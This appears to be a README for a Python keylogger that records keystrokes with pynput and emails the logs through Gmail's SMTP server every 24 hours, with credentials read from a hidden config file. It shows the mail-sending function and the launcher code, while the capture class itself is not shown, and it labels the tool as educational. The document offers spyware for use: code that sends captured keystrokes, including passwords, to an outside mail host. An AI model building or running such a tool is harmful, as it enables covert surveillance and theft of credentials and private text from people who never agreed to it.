# Keylogger

Keylogger with send message gmail
The program reads the buttons entered from the keyboard key
Sends in the form of a log to the mail

The program is written for educational purposes.

# Import
```python
import pynput.keyboard
import threading
import smtplib
```

# Explanation
Settings may differ from preference and SMTP. Server
Debuglevel -> False, Turns on when debugging a program
```python
def send_mail(email, password, message):
    """Send email smtp.google.com."""
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.set_debuglevel(False)
    server.login(email, password)
    server.auth_plain()
    server.sendmail(email, email, message)
    server.quit()
```
# Zilogger
Gets the input time interval for sending email, and variables from the config.py(is hidden) file for authorization on the SMTP server
```python
import keylogger
import config

# 86400 second -> 24 hours
my_keylogger = keylogger.Keylogger(86400, config.EMAIL, config.PASSWORD)
my_keylogger.start()
```
